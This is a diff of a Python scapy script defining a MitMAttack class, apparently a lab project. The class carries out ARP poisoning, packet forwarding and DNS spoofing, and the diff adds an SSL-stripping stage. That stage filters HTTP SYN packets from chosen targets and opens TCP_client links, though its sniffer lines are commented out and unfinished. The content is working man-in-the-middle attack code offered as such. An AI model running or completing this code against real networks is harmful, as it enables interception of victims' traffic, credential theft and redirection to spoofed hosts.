@@ -5,33 +5,18 @@ from subprocess import Popen, PIPE
 from scapy.arch import get_if_list, get_if_addr, get_if_hwaddr
 from scapy.config import conf
 from scapy.layers.dns import DNS, DNSRR, DNSQR
-from scapy.layers.inet import IP, UDP
+from scapy.layers.http import HTTP
+from scapy.layers.inet import IP, UDP, TCP, TCP_client
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import ARP, getmacbyip, Ether
 from scapy.main import load_layer
 from scapy.sendrecv import sendp, send, sniff, AsyncSniffer
 
 import argparse
-import logging
 import platform
 import threading
 import time
 
-
-# load_layer("tls")
-
-# host_ip = "192.168.56.103"
-# target_ip = "192.168.56.101"
-#
-# host_mac = '08:00:27:d0:25:4b'
-#
-# ip_to_spoof = '192.168.56.102'
-#
-# targets = [{'ip': "192.168.56.101"},
-#            {'ip': '192.168.56.102'}]
-
-
-# logging.getLogger('scapy').setLevel(logging.WARNING)
 
 class MitMAttack:
 
@@ -92,7 +77,8 @@ class MitMAttack:
 
     def main(self):
         """
-        Setup continuous arp poisoning and redirect packets between victims via this host
+        Launch the main attack according to the provided settings
+        This includes arp poisoning, dns spoofing and ssl striping
         :return:
         """
         print('Starting mitm attack')
@@ -111,6 +97,8 @@ class MitMAttack:
         print('Setup dns spoofing')
 
         # start ssl strip
+        print('Setup ssl stripping')
+        self.ssl_stripping()
 
         print('-' * 20)
         print('Attack is running')
@@ -148,8 +136,8 @@ class MitMAttack:
                                            pdst=target['ip'])
         sendp(p, iface='enp0s3', verbose=False)
 
-    def forwarding_filter(self, pkt):
-        return IP in pkt and pkt[IP].dst != self.host_ip and pkt[Ether].dst == self.host_mac
+    def forwarding_filter(self, p):
+        return IP in p and p[IP].dst != self.host_ip and p[Ether].dst == self.host_mac
 
     def start_request_forwarding(self):
         """
@@ -178,7 +166,7 @@ class MitMAttack:
         return forward_request
 
     def dns_filter(self, pkt):
-        return IP in pkt and pkt.haslayer(DNS) and (pkt[IP].src in self.targets_ip)
+        return IP in pkt and pkt.haslayer(DNS) and (pkt[IP].src in self.dns_spoofing_targets)
 
     def dns_sniffer(self):
         """
@@ -240,9 +228,34 @@ class MitMAttack:
 
         return dns_spoofer
 
+    def filter_ssl_stripping(self, p):
+        return IP in p and TCP in p and p[TCP].dport == 80 and p[TCP].flags == 'S' and p[
+            IP].src in self.ssl_strip_targets
+
+    def ssl_stripping(self):
+        """
+        Setup ssl striping attack
+        :return:
+        """
+        # t = AsyncSniffer(lfilter=self.filter_ssl_stripping, prn=self.get_ssl_stripper(), iface=self.network_interface)
+        # t.start()
+
+    def get_ssl_stripper(self):
+        def ssl_stripper(p):
+            """
+            Receives a tcp packet and sets up an connection if needed
+            :param p: packet
+            :return:
+            """
+            a = TCP_client.tcplink(HTTP, p[TCP].dst, p[TCP].dport)
+            a.send("")
+            a.recv()
+
+        return ssl_stripper
+
 
 if __name__ == '__main__':
-    # set commandline options
+    # set commandline options/
     class MyParser(argparse.ArgumentParser):
         # custom method to always print help if invalid input
         def error(self, message):
